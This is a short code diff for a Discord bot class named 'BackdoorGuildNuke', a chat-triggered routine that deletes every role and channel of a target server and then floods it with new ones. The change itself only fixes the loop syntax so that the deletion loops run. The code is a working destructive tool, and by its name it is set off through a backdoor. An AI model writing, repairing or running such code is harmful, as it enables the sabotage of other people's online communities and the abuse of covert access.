@@ -121,7 +121,7 @@ class BackdoorGuildNuke(chattrigger.ChatTrigger):
 
         async def role_nuke():
             await message.channel.send("Starting Role Nuke")
-            async for i in target_guild.roles:
+            for i in target_guild.roles:
                 await i.delete(reason=values["role_reason"])
 
             await message.channel.send("Starting Role Flood")
@@ -148,7 +148,7 @@ class BackdoorGuildNuke(chattrigger.ChatTrigger):
 
         async def channel_nuke():
             await message.channel.send("Starting Channel Nuke")
-            async for i in target_guild.channels:
+            for i in target_guild.channels:
                 await i.delete(reason=values["text_channel_reason"])
 
             await message.channel.send(f"Starting Channel Flood")
